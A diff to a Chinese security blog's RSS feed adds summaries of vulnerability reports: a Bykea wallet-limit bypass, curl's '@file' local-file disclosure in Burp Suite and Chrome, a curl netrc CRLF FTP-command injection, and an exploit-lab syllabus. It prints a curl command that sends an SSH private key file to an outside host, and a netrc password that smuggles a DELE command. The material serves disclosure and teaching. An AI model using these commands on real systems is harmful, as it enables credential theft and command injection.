@@ -7,7 +7,259 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>qife</copyright>
-        <lastBuildDate>Sat, 02 Aug 2025 20:25:35 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sun, 03 Aug 2025 07:38:37 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Bykea漏洞报告：绕过青铜合作伙伴钱包限制接受负余额行程的技术分析</title>
+        <link>http://localhost:1313/p/bykea%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E7%BB%95%E8%BF%87%E9%9D%92%E9%93%9C%E5%90%88%E4%BD%9C%E4%BC%99%E4%BC%B4%E9%92%B1%E5%8C%85%E9%99%90%E5%88%B6%E6%8E%A5%E5%8F%97%E8%B4%9F%E4%BD%99%E9%A2%9D%E8%A1%8C%E7%A8%8B%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
+        <pubDate>Sun, 03 Aug 2025 07:38:37 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/bykea%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E7%BB%95%E8%BF%87%E9%9D%92%E9%93%9C%E5%90%88%E4%BD%9C%E4%BC%99%E4%BC%B4%E9%92%B1%E5%8C%85%E9%99%90%E5%88%B6%E6%8E%A5%E5%8F%97%E8%B4%9F%E4%BD%99%E9%A2%9D%E8%A1%8C%E7%A8%8B%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;h3 id=&#34;漏洞技术细节&#34;&gt;漏洞技术细节
+&lt;/h3&gt;&lt;p&gt;安全研究员&lt;code&gt;@bugbountywithmarco&lt;/code&gt;发现Bykea平台存在业务逻辑缺陷，允许钱包余额为负的青铜级合作伙伴绕过平台限制接受行程订单。通过串联调用三个后端API端点实现漏洞利用：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;初始请求&lt;/strong&gt;&lt;br&gt;
+&lt;code&gt;GET /v2/:city_id/bookings&lt;/code&gt; 获取城市预订信息&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;位置更新&lt;/strong&gt;&lt;br&gt;
+&lt;code&gt;PUT /api/v2/driver/update/location&lt;/code&gt; 携带任意&lt;code&gt;trip_id&lt;/code&gt;更新司机位置&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;报价提交&lt;/strong&gt;&lt;br&gt;
+&lt;code&gt;POST /api/v2/offer/bid&lt;/code&gt; 提交行程报价&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;通过这种调用链，负余额司机可重置其可用状态并成功提交报价，从而绕过钱包余额限制非法获取行程订单。&lt;/p&gt;
+&lt;h3 id=&#34;时间线摘要&#34;&gt;时间线摘要
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;2024-11-27 17:43 UTC 漏洞提交&lt;/li&gt;
+&lt;li&gt;2024-11-28 07:19 UTC 获得赏金&lt;/li&gt;
+&lt;li&gt;初始评级8.6（高危）后调整为6.5（中危）&lt;/li&gt;
+&lt;li&gt;2025-06-13 漏洞报告公开&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;技术影响&#34;&gt;技术影响
+&lt;/h3&gt;&lt;p&gt;该漏洞属于&lt;strong&gt;业务逻辑错误&lt;/strong&gt;类别，暴露了三个关键问题：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;端点权限校验不完善&lt;/li&gt;
+&lt;li&gt;状态管理机制存在缺陷&lt;/li&gt;
+&lt;li&gt;负余额检测逻辑可被绕过&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;平台最终通过增强钱包状态校验机制修复该漏洞。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>curl特性曝光Burp Suite和Google Chrome本地文件泄露漏洞</title>
+        <link>http://localhost:1313/p/curl%E7%89%B9%E6%80%A7%E6%9B%9D%E5%85%89burp-suite%E5%92%8Cgoogle-chrome%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</link>
+        <pubDate>Sun, 03 Aug 2025 05:15:26 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/curl%E7%89%B9%E6%80%A7%E6%9B%9D%E5%85%89burp-suite%E5%92%8Cgoogle-chrome%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/</guid>
+        <description>&lt;img src="https://portswigger.net/cms/9a8b6e0b1d8b5b5a/cover-image/research.jpg" alt="Featured image of post curl特性曝光Burp Suite和Google Chrome本地文件泄露漏洞" /&gt;&lt;p&gt;在这篇文章中，我们将探讨curl中一个鲜为人知的特性，该特性导致了Burp Suite Pro和Google Chrome的本地文件泄露漏洞。虽然我们早已为Burp Suite发布了补丁，但怀疑该技术可能对利用其他具有&amp;quot;复制为curl命令&amp;quot;功能或从命令行调用curl的应用程序有所帮助。该漏洞由Paul Mutton通过我们的漏洞赏金计划私下报告，并慷慨地允许我们发布这篇分析报告。&lt;/p&gt;
+&lt;p&gt;Burp Suite用户经常构造复杂的HTTP请求来演示网站漏洞。为了更轻松地与他人共享这些概念验证漏洞利用，我们提供了&amp;quot;复制为curl命令&amp;quot;功能，可生成复制Burp Suite中请求的curl命令。&lt;/p&gt;
+&lt;p&gt;例如，给定以下请求：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;POST / HTTP/1.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host: portswigger.net
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Type: application/x-www-form-urlencoded
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Content-Length: 7
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;foo=bar
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;点击&amp;quot;复制为curl命令&amp;quot;后，Burp Suite会生成以下命令并复制到剪贴板：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -i -s -k \
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     -X $&amp;#39;POST&amp;#39; \
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     -H $&amp;#39;Host: portswigger.net&amp;#39; \
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     -H $&amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39; \
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     -H $&amp;#39;Content-Length: 7&amp;#39; \
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     --data-binary $&amp;#39;foo=bar&amp;#39; \
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     $&amp;#39;https://portswigger.net/&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;您可以将此命令粘贴到终端中，在Burp Suite外部重新发出请求。我们非常注意转义这些数据，以避免用户因恶意请求注入额外的shell命令或任意curl参数而受到攻击。但不幸的是，存在一个更微妙的问题。您能发现吗？&lt;/p&gt;
+&lt;p&gt;答案一如既往地藏在友好的手册中：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--data-binary &amp;lt;data&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;这将完全按指定方式发送数据，不进行任何额外处理。
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;如果数据以字母@开头，其余部分应为文件名。
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;因此，以下命令是安全的：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl --data-binary &amp;#39;/home/albinowax/.ssh/id_rsa&amp;#39; --trace-ascii - https://02.rs/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;=&amp;gt; 发送数据，28字节(0x1c)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0000: /home/albinowax/.ssh/id_rsa
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;而这个就不那么安全了：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl --data-binary &amp;#39;@/home/albinowax/.ssh/id_rsa&amp;#39; --trace-ascii - https://02.rs/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;=&amp;gt; 发送数据，662字节(0x296)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; -----BEGIN RSA PRIVATE KEY-----
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;.b3BlbnNzaC1rZXktdjEA....
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(不是我的真实私钥)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;我们在2020.5.1版本中修复了这个漏洞，如果请求体以@符号开头，就改用更新、更安全但支持较少的&amp;ndash;data-raw标志。&lt;/p&gt;
+&lt;p&gt;我们很幸运，因为在Burp Suite中利用此漏洞需要相对较多的用户交互——攻击者需要诱导用户访问恶意网站，将精心设计的请求复制为curl命令，然后通过命令行执行。如果网站使用curl并带有攻击者控制的请求体，则可能产生更大的影响，因此在SSRF测试期间绝对值得关注。@文件读取行为也适用于标头，因此在允许定义自定义标头的网站上可能有用。&lt;/p&gt;
+&lt;p&gt;尽管这个特性让我们(和Chrome)感到意外，但它已完全记录在案，因此我们不认为这是curl本身的漏洞。这让我想起了服务器端模板注入，在那里沙箱逃逸可能就像阅读一个被其他人忽视的手册页面一样简单。&lt;/p&gt;
+&lt;p&gt;再次感谢Paul分享这个很酷的技术。下次见！&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>curl netrc文件CRLF注入漏洞分析</title>
+        <link>http://localhost:1313/p/curl-netrc%E6%96%87%E4%BB%B6crlf%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+        <pubDate>Sun, 03 Aug 2025 04:08:44 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/curl-netrc%E6%96%87%E4%BB%B6crlf%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;h1 id=&#34;curl-netrc-crlf注入漏洞报告&#34;&gt;curl netrc crlf注入漏洞报告
+&lt;/h1&gt;&lt;h2 id=&#34;摘要&#34;&gt;摘要
+&lt;/h2&gt;&lt;p&gt;curl允许在netrc文件的登录和密码字段中编码CR和LF字符。当攻击者能够影响netrc文件内容时，可通过在登录名或密码中注入CRLF来实现FTP命令注入。POP3协议同样可能受影响但未经测试。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞复现步骤&#34;&gt;漏洞复现步骤
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;创建包含恶意payload的netrc文件：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;machine localhost
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  login alice
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  password &amp;#34;alicespassword\r\nDELE pocfile.txt&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;启动测试用的FTP服务器：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -ne &lt;span class=&#34;s2&#34;&gt;&amp;#34;220 \r\n331 \r\n&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; nc -v -l -p &lt;span class=&#34;m&#34;&gt;9999&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;使用受影响curl版本发起请求：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -v --netrc-file netrc ftp://localhost:9999
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
+&lt;/h2&gt;&lt;p&gt;对于使用CR/LF作为分隔符的协议（如FTP、POP3等），在构造命令时不应允许用户名或密码中包含CR或LF字符。&lt;/p&gt;
+&lt;h2 id=&#34;影响评估&#34;&gt;影响评估
+&lt;/h2&gt;&lt;p&gt;可实现FTP/POP3命令注入。项目方最终认定该问题属于&amp;quot;本地攻击者已存在&amp;quot;类别，不构成安全漏洞。&lt;/p&gt;
+&lt;h2 id=&#34;时间线&#34;&gt;时间线
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;2024年11月9日：漏洞报告提交&lt;/li&gt;
+&lt;li&gt;2024年11月10日：curl团队确认问题性质&lt;/li&gt;
+&lt;li&gt;2024年11月10日：报告关闭（标记为Not Applicable）&lt;/li&gt;
+&lt;li&gt;2025年7月7日：报告公开披露&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>漏洞利用实验室：Blackhat 2016漏洞实验课程 - 课前教程与破解挑战</title>
+        <link>http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4blackhat-2016%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C%E8%AF%BE%E7%A8%8B-%E8%AF%BE%E5%89%8D%E6%95%99%E7%A8%8B%E4%B8%8E%E7%A0%B4%E8%A7%A3%E6%8C%91%E6%88%98/</link>
+        <pubDate>Sun, 03 Aug 2025 03:03:19 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4blackhat-2016%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C%E8%AF%BE%E7%A8%8B-%E8%AF%BE%E5%89%8D%E6%95%99%E7%A8%8B%E4%B8%8E%E7%A0%B4%E8%A7%A3%E6%8C%91%E6%88%98/</guid>
+        <description>&lt;h1 id=&#34;blackhat-2016漏洞实验课程&#34;&gt;Blackhat 2016漏洞实验课程
+&lt;/h1&gt;&lt;h2 id=&#34;课前教程模块&#34;&gt;课前教程模块
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;基础缓冲区溢出&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;32位栈溢出原理与实践&lt;/li&gt;
+&lt;li&gt;通过恶意输入覆盖EIP寄存器&lt;/li&gt;
+&lt;li&gt;使用坏字符检测定位内存冲突&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;现代绕过技术&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;DEP/NX保护机制的ROP链构造&lt;/li&gt;
+&lt;li&gt;绕过ASLR的内存地址泄露技术&lt;/li&gt;
+&lt;li&gt;使用JIT喷射对抗控制流保护&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;crackme挑战集&#34;&gt;Crackme挑战集
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Level1&lt;/strong&gt;&lt;br&gt;
+基础栈溢出（无保护机制）&lt;br&gt;
+要求：通过覆盖返回地址执行shellcode&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Level2&lt;/strong&gt;&lt;br&gt;
+带Canary保护的栈溢出&lt;br&gt;
+要求：爆破/泄露栈金丝雀值&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Level3&lt;/strong&gt;&lt;br&gt;
+完全防护环境（DEP+ASLR）&lt;br&gt;
+要求：组合使用ROP与内存泄露技术&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;实验环境要求：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;VMware Workstation 12+&lt;/li&gt;
+&lt;li&gt;Kali Linux虚拟机&lt;/li&gt;
+&lt;li&gt;预装GDB-Peda/Pwndbg调试器&lt;/li&gt;
+&lt;li&gt;Python Exploit开发套件&lt;/li&gt;
+&lt;/ul&gt;&lt;/blockquote&gt;
+</description>
+        </item>
+        <item>
         <title>RSKJ服务器拒绝服务漏洞分析与修复</title>
         <link>http://localhost:1313/p/rskj%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E4%BF%AE%E5%A4%8D/</link>
         <pubDate>Sat, 02 Aug 2025 20:25:35 +0800</pubDate>
